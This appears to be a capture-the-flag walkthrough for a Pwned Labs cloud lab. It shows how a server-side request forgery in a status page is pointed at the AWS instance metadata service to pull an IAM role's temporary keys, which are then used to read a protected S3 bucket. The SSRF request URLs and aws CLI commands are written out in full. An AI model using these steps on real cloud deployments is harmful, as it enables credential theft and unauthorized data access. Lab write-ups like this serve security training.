https://pwnedlabs.io/labs/ssrf-to-pwned

`http://app.huge-logistics.com`

Inspect the source code to find the bucket `huge-logistics-storage`. List files in the bucket:

```bash
aws s3 ls huge-logistics-storage --no-sign-request
	backup/
	web/
aws s3 ls huge-logistics-storage/backup/ --no-sign-request
	cc-export2.txt
	flag.txt
```

Cannot access the files. Enumerate the website further to find `status/statis.php` which takes the following parameter:
	`?name=hugelogisticsstatus.com`
We can replace this existing parameter URL with the following URL using the internal link-local UP address `169.254.169.254` that hosts the metadata service:

```http
http://app.huge-logistics.com/status/status.php?name=169.254.169.254/latest/meta-data/iam/info
	IAM role
```

This reveals an IAM role configured and named `MetapwnedS3Access`. Enumerate the credentials for this role with:

```http
http://app.huge-logistics.com/status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access
	AWS Keys
```

Configure AWS with the keys for `MetapwnedS3Access`:

```bash
aws configure --profile meta
aws configure set aws_session_token '<SESSION_TOKEN>' --profile meta
aws sts get-caller-identity --profile meta
```

Now we can try the `huge-logistics-storage/backup/` bucket again... Success!:

```bash
aws s3 cp s3://huge-logistics-storage/backup/flag.txt . --profile meta
```